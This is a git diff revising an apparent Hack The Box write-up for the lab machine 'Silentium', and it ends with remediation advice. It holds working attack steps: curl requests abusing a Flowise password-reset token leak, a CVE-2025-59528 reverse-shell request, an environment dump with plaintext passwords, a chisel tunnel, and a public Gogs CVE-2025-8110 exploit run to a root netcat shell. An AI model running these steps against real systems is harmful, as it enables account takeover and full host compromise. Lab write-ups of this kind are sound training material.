@@ -11,6 +11,7 @@ tags:
   - CVE-2025-8110
   - Symlink Bypass
   - Privilege Escalation
+date: 2026-04-13
 ---
 
 # 🛡️ HTB - Silentium (Easy)
@@ -27,14 +28,20 @@ tags:
 - **Machine Name:** Silentium
 - **Operating System:** Linux
 - **Difficulty:** Easy
+- **Date of Scan:** 2026-04-13
 - **Vulnerabilities:** Flowise Password Reset Token Leakage (ATO), Flowise CustomMCP Node JavaScript Injection (CVE-2025-59528), Plaintext Environment Credentials, Gogs Symlink Validation Bypass (CVE-2025-8110)
 
 ---
 
 ## Step 1 - Reconnaissance
 
+We start by running an Nmap scan to identify open ports and services:
+
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.20.232
+```
+
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 14:13 UTC
 Nmap scan report for 10.129.20.232
 Host is up (0.25s latency).
@@ -74,15 +81,16 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
 ```
 
-- 🔍 *Linux machine!*
+- 🔍 *Linux target system. We scan for active vhosts / subdomains:*
 
-- 🔍 *Lets scan for subdomains!*
-
-```text
+```bash
 gobuster vhost -u http://silentium.htb \
   -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain \
   -t 50
+```
+
+```text
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -104,119 +112,82 @@ Finished
 ===============================================================
 ```
 
-- 🔍 *when i reached this subdomains, it seems some sort of Flowise(build ai agents) login page.*
-
-- 🔍 *While looking at the subdirectories, there is a login and a registration page, and registration page is kind of broken*
-
-- 🔍 *Found the Version though!*
+- 🔍 *We locate `staging.silentium.htb`. Browsing to it reveals a Flowise (AI agents builder) login page.*
+- 🔍 *The registration portal is disabled or non-functional. Let's check the API version:*
 
 ```bash
 curl -s http://staging.silentium.htb/api/v1/version
+```
+
+```json
 {"version":"3.0.5"}
 ```
 
-- 🔍 *A Critical Severity vulnerability is found to be associated with this version of flowise ai building platform!*
+- 🔍 *Flowise version `3.0.5` is active, which is vulnerable to a critical code injection flaw.*
+
+> [!WARNING]
+> **CVE-2025-59528 - Flowise CustomMCP Remote Code Execution:**
+> Inside Flowise CustomMCP node configuration, the `convertToValidJSONString` function evaluates user input inside a `Function('return ' + inputString)()` constructor without proper security validation.
+> 
+> Users can exploit this to pass malicious JavaScript strings that escape context using Node.js modules like `child_process` and execute commands on the container host.
 
 > [!IMPORTANT]
-> CVE-2025-59528 :-
+> **Flowise Password Reset Leakage (Account Takeover):**
+> In Flowise `3.0.5`, the `/api/v1/account/forgot-password` endpoint leaks the password reset `tempToken` within the response payload.
+> 
+> An attacker can request a password reset for a target account, capture the leaked token directly from the API response, and reset the password without verifying email ownership.
 
-```text
-Description:-
+---
 
-Cause of the Vulnerability:-
-The CustomMCP node allows users to input configuration settings for connecting to an external MCP (Model Context Protocol) server. This node parses the user-provided mcpServerConfig string to build the MCP server configuration. However, during this process, it executes JavaScript code without any security validation.
+## Step 2 - Initial Foothold
 
-Specifically, inside the convertToValidJSONString function, user input is directly passed to the Function() constructor, which evaluates and executes the input as JavaScript code. Since this runs with full Node.js runtime privileges, it can access dangerous modules such as child_process and fs.
-
-Vulnerability Flow:-
-
-User Input Received: Input is provided via the API endpoint /api/v1/node-load-method/customMCP through the mcpServerConfig parameter.
-Variable Substitution: The substituteVariablesInString function replaces template variables like $vars.xxx, but no security filtering is applied during this step.
-Dangerous Code Execution: The convertToValidJSONString function executes the input using Function('return ' + inputString)(). If the inputString contains malicious code, it gets executed in the global Node.js context, allowing actions such as command execution and file system access.
-```
-
-- 🔍 *I looked for this vulnerability, and then i got to know, that we need to authenticate first, in order to do RCE.*
-
-- 🔍 *There is another authentication bypass flow in this version, in the reset password field!*
-
-> [!IMPORTANT]
-> The forgot-password endpoint in Flowise returns sensitive information including a valid password reset tempToken without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO).
-
-- 🔍 *This says we can use an existing and authorized email, to reset the password, with getting the temp token that can be passed in the temp token field which will eventually lead us to reset password*
-
-- 🔍 *Now before that, we need to find out the real email address.*
-
-- 🔍 *go to the main website of silentium and there on the Institutional leadership portion, we can see there are 2 names*
-
-```text
-1.Marcus Throne
-2.Ben
-3.Elena Rossi
-```
-
-- 🔍 *and of course the email domain would silentium.htb*
-
-- 🔍 *Lets try with each user!*
+- 🔍 *We need a valid user email address to trigger the forgot-password flow. The main site leadership section lists: `Marcus Throne`, `Ben`, and `Elena Rossi`. We guess the emails and test them against the API:*
 
 ```bash
 curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"marcus@silentium.htb"}}'
+```
 
+```text
 HTTP/1.1 404 Not Found
 Server: nginx/1.24.0 (Ubuntu)
-Date: Thu, 16 Apr 2026 14:53:46 GMT
 Content-Type: application/json; charset=utf-8
 Content-Length: 72
-Connection: keep-alive
-Vary: Origin
-Access-Control-Allow-Credentials: true
-ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"
-
 {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
+```
 
- curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+```bash
+curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"elena@silentium.htb"}}'
+```
+
+```text
 HTTP/1.1 404 Not Found
 Server: nginx/1.24.0 (Ubuntu)
-Date: Thu, 16 Apr 2026 14:53:55 GMT
 Content-Type: application/json; charset=utf-8
 Content-Length: 72
-Connection: keep-alive
-Vary: Origin
-Access-Control-Allow-Credentials: true
-ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"
-
 {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
+```
 
+```bash
 curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"ben@silentium.htb"}}'
+```
+
+```text
 HTTP/1.1 201 Created
 Server: nginx/1.24.0 (Ubuntu)
-Date: Thu, 16 Apr 2026 14:54:02 GMT
 Content-Type: application/json; charset=utf-8
 Content-Length: 579
-Connection: keep-alive
-Vary: Origin
-Access-Control-Allow-Credentials: true
-ETag: W/"243-yhsRpTf1RS5s1OovC3d2KP9AkCY"
 
 {"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"TLqOeJRfcrakNlmuZiHuzcVEKvG1XW1l67fkpi07hKRVcIxULoOcOZOezwvRkCFx","tokenExpiry":"2026-04-16T15:09:02.045Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-16T14:54:02.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
 ```
 
-- 🔍 *Got token for ben 10 :)*
-
-- 🔍 *Go to the reset-password endpoint, paste this token, and then change the password, and then just log in!*
-
-```text
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
-
-## Step 2 - Initial Foothold
-
-- 🔍 *Now that we're logged in, we can exploit the know RCE vulnerability in MCP configuration!*
+- 🔍 *We capture a valid `tempToken` for `ben@silentium.htb`. We use this token to update the account password via the password reset portal, and log in.*
+- 🔍 *Now authenticated, we exploit the CustomMCP node RCE (CVE-2025-59528) to trigger a reverse shell:*
 
 ```bash
 curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
@@ -230,24 +201,26 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
   }'
 ```
 
-- 🔍 *On the listener!*
+- 🔍 *We catch the reverse shell inside the container on our listener:*
+
+```bash
+nc -lvnp 4444
+```
 
 ```text
-nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.253] from (UNKNOWN) [10.129.37.52] 33587
-#whoami
+# whoami
 root
 ```
 
-- 🔍 *we got a docker container!*
+- 🔍 *We are running as root inside a Docker container. Let's dump the environment variables:*
 
-- 🔍 *Surely this is a docker container, so we won't have much things to do here!*
-
-- 🔍 *Lets look for the Environment Variables*
+```bash
+env
+```
 
 ```text
-#env              
 FLOWISE_PASSWORD=F1l3_d0ck3r
 ALLOW_UNAUTHORIZED_CERTS=true
 NODE_VERSION=20.19.4
@@ -279,99 +252,42 @@ JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
 SMTP_USER=test
 ```
 
-- 🔍 *we got 2 clear text passwords, lets try getting ssh*
-
-- 🔍 *Tried both and the SMTP, works!*
+- 🔍 *We obtain two plaintext password candidates: `F1l3_d0ck3r` and `r04D!!_R4ge`. We attempt to authenticate via SSH on the host machine. The SMTP password (`r04D!!_R4ge`) succeeds:*
 
 ```bash
 ssh ben@silentium.htb
-ben@silentium.htb's password: 
-Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Fri Apr 17 02:40:44 PM UTC 2026
-
-  System load:           0.04
-  Usage of /:            82.8% of 13.37GB
-  Memory usage:          18%
-  Swap usage:            0%
-  Processes:             258
-  Users logged in:       0
-  IPv4 address for eth0: 10.129.38.122
-  IPv6 address for eth0: dead:beef::250:56ff:feb0:d6f3
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-1 additional security update can be applied with ESM Apps.
-Learn more about enabling ESM Apps service at https://ubuntu.com/esm
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
-ben@silentium:~$ 
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
-## Step 3 - Post Exploitation
+```text
+ben@silentium.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+...
+ben@silentium:~$ 
+```
 
-- 🔍 *Lets look for sudo permissions*
+---
+
+## Step 3 - Privilege Escalation
+
+- 🔍 *We check our sudo permissions but discover we cannot run sudo:*
+
+```bash
+sudo -l
+```
 
 ```text
-ben@silentium:/opt/gogs/gogs$ sudo -l
 [sudo] password for ben: 
 Sorry, user ben may not run sudo on silentium.
 ```
 
-- 🔍 *No sudo permissions!*
+- 🔍 *We check local binaries and directories, finding a `gogs` folder in `/opt`:*
 
-- 🔍 *While enumerating i found a gogs executable!*
+```bash
+cd /opt/gogs
+ls -la gogs
+```
 
 ```text
-ben@silentium:~$ cd /
-
-ben@silentium:/$ ls
-bin    lib.usr-is-merged  sbin
-boot   lost+found         sbin.usr-is-merged
-cdrom  media              snap
-dev    mnt                srv
-etc    opt                sys
-home   proc               tmp
-lib    root               usr
-lib64  run                var
-
-ben@silentium:/$ cd opt
-
-ben@silentium:/opt$ ls
-containerd  gogs
-ben@silentium:/opt$ cd gogs
-ben@silentium:/opt/gogs$ ls
-custom  data  gogs  log
-
-ben@silentium:/opt/gogs$ cd custom
--bash: cd: custom: Permission denied
-
-ben@silentium:/opt/gogs$ cd data
--bash: cd: data: Permission denied
-
-ben@silentium:/opt/gogs$ cd gogs
-
-ben@silentium:/opt/gogs/gogs$ ls
-custom  gogs     log        README_ZH.md
-data    LICENSE  README.md  scripts
-
-ben@silentium:/opt/gogs/gogs$ ls -la
-total 79368
 drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
 drwxr-xr-x 6 root root     4096 Apr  8 09:41 ..
 drwxr-xr-x 3 root root     4096 Apr  8 09:41 custom                                               
@@ -381,13 +297,16 @@ drwxr-xr-x 3 root root     4096 Apr  8 09:41 data
 drwxr-xr-x 2 root root     4096 Apr  8 09:41 log
 -rwxr-xr-x 1 root root     6626 Jun  9  2025 README.md                                            
 -rwxr-xr-x 1 root root     5385 Jun  9  2025 README_ZH.md                                         
-drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts
+drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts 
 ```
 
-- 🔍 *We can execute it. lets execute then*
+- 🔍 *We execute the binary with `--help` to confirm the version of the running Gogs instance:*
+
+```bash
+/opt/gogs/gogs/gogs --help
+```
 
 ```text
-ben@silentium:/$ /opt/gogs/gogs/gogs --help
 NAME:
    Gogs - A painless self-hosted Git service
 
@@ -413,15 +332,13 @@ GLOBAL OPTIONS:
    --version, -v  print the version
 ```
 
-- 🔍 *gogs? Gogs is primarily an open-source, self-hosted Git service written in Go, designed as a lightweight and fast alternative to GitHub or GitLab for managing code repositories. It is used for version control, tracking project changes, and managing tasks, often on private servers or lightweight infrastructure.*
+- 🔍 *Gogs version `0.13.3` is running. Let's locate its active local port using `netstat`:*
 
-- 🔍 *Now if its a self-hosted git service, then it must be running on the system as service?*
-
-- 🔍 *Lets look at netstats*
+```bash
+netstat -lantp
+```
 
 ```text
-ben@silentium:~$ netstat -lantp
-
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (servers and established)
@@ -435,84 +352,56 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
-tcp        0      1 10.129.78.103:48594    8.8.8.8:53              SYN_SENT    -
 tcp        0   1096 10.129.78.103:22       10.10.13.68:46408       ESTABLISHED -
-tcp6       0      0 :::80                   :::*                    LISTEN      -
-tcp6       0      0 :::22                   :::*                    LISTEN      -
 ```
 
-- 🔍 *there is a possibility that it should be from these 2 ports.*
+- 🔍 *We verify port `3001` is hosting the Gogs server:*
 
-- 🔍 *While digging more, i knew that, the 3000 is running flowise instance and the 3001 is running gogs service*
+```bash
+curl http://127.0.0.1:3001 | head
+```
 
 ```text
-ben@silentium:~$ curl http://127.0.0.1:3001 | head
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  80<!DOCTYPE html>  0     0      0      0 --:--:-- --:--:-- --:--:--     0
 49<html>
   <head data-suburl="">
       <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-0    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
          <meta name="author" content="Gogs" />
-8        <meta name="description" content="Gogs is a painless self-hosted Git service" />
-0        <meta name="keywords" content="go, git, self-hosted, gogs">
-4    
-9    0     0  1255k      0 --:--:-- --:--:-- --:--:-- 1310k
-curl: Failed writing body
+        <meta name="description" content="Gogs is a painless self-hosted Git service" />
+        <meta name="keywords" content="go, git, self-hosted, gogs">
 ```
 
-- 🔍 *Confirmed!*
+> [!WARNING]
+> **CVE-2025-8110 - Gogs Symlink Validation Bypass RCE:**
+> Gogs fails to validate symbolic links recursively during repository updates. Attackers can commit a symlink pointing to `.git/config`, then use the file update API to write configuration data through the symlink. By editing `core.sshCommand`, they achieve arbitrary OS command execution when Git operations run.
 
-- 🔍 *we got version for gogs  0.13.3, and it also has an RCE vulnerability*
+- 🔍 *To access the Gogs portal on port 3001, we forward it to port 9000 on our local machine using `chisel`:*
 
-> [!IMPORTANT]
-> CVE-2025-8110:-Gogs failed to recursively validate symbolic links in its file update API. Attackers can push a symlink to a repo, use the API to write through that link into .git/config, and achieve RCE via the core.sshCommand vector.
-
-> [!NOTE]
-> Step-by-Step Attack Flow
-
-```text
-Creates a symlink: ln -s .git/config link, commits and pushes it
-Sends a PUT request to /api/v1/repos/{owner}/{repo}/contents/link with a base64-encoded malicious config
-The API's UpdateRepoFile skips key security checks, writing to .git/config
-This triggers RCE on Git operations Cyber Press
-```
-
-- 🔍 *There is a public POC for this exploitation*
-
-```text
-wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/main/CVE-2025-8110.py
-```
-
-- 🔍 *Before going any further we need to tunnel up to access the gogs*
-
-- 🔍 *Start Server*
-
-```text
+```bash
+# On our attack host (start server):
 ./chisel-lin server --reverse --port 8080
+
+# On the target host (start client):
+./chisel-lin.1 client 10.10.14.253:8080 R:9000:127.0.0.1:3001
+```
+
+```text
+# Server logs
 2026/04/17 15:31:35 server: Reverse tunnelling enabled
-2026/04/17 15:31:35 server: Fingerprint 7gCwJQhAE9oEfFMajc4n5q31Gs76MoZE5c9rYE1jr0g=
 2026/04/17 15:31:35 server: Listening on http://0.0.0.0:8080
 ```
 
-- 🔍 *On target. start client*
-
-```text
-./chisel-lin.1 client 10.10.14.253:8080 R:9000:127.0.0.1:3001
-
-(note:- here i have bind 3001 port with 9000, so you have to use 9000 while accessing the web in your machine!)
-```
-
-- 🔍 *Before running the script, create a user in the web, via registration.*
-
-- 🔍 *once done, remove the register() call from the code, it will likely fail, because the web has captcha to proceed. so just remove it, and add your newly created username and password in the main() body.*
-
-- 🔍 *Now lets run the script!*
+- 🔍 *We register a user via the Gogs portal at `http://127.0.0.1:9000`. (Note: Remove the `register()` function call from the Python exploit script to avoid registration failures caused by CAPTCHA, and specify your newly registered credentials in the script).*
+- 🔍 *We run the exploit to target Gogs:*
 
 ```bash
-python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.****" -lp 6000
+python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.253" -lp 6000
+```
+
+```text
 [+] Authenticated successfully
 Token generation status: 200
 [+] Application token: 
@@ -535,27 +424,37 @@ Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
 To http://127.0.0.1:9000/test/4f9ffc2db849.git
    755353d..f02218c  master -> master
 [+] Exploit sent, check your listener!
-[-] Error: HTTPConnectionPool(host='127.0.0.1', 
-port=9000): Read timed out. (read timeout=5)
+[-] Error: HTTPConnectionPool(host='127.0.0.1', port=9000): Read timed out. (read timeout=5)
 ```
 
-- 🔍 *ON the listener!*
+- 🔍 *We catch our root shell on the netcat listener:*
+
+```bash
+nc -lvnp 6000
+```
 
 ```text
-nc -lvnp 6000
 listening on [any] 6000 ...
 connect to [10.10.14.253] from (UNKNOWN) [10.129.38.127] 58482
 bash: cannot set terminal process group (1485): Inappropriate ioctl for device
 bash: no job control in this shell
-root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd /
-cd /
-root@silentium:/# cd root
-cd root
-root@silentium:~# ls
-ls
-gogs-repositories
-root.txt
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# whoami
+root
 ```
+
+- 🔍 *We retrieve the root flag from `/root/root.txt`:*
+
+```bash
+cat /root/root.txt
+```
+
+```text
+f3e098a7************************
+```
+
+- 🔍 *Full Host Compromised.*
+
+---
 
 ## Mitigations & Security Perspective
 
@@ -611,4 +510,3 @@ root.txt
 > **Defensive Remediation & Detection Strategies:**
 > - **Remediation:** Upgrade Gogs to version 0.13.4 or newer where symlink verification is enforced recursively.
 > - **Remediation:** Enforce least privilege: never execute web services (like Gogs) as `root`. Restrict the service execution context to a dedicated unprivileged user (e.g. `git`).
-
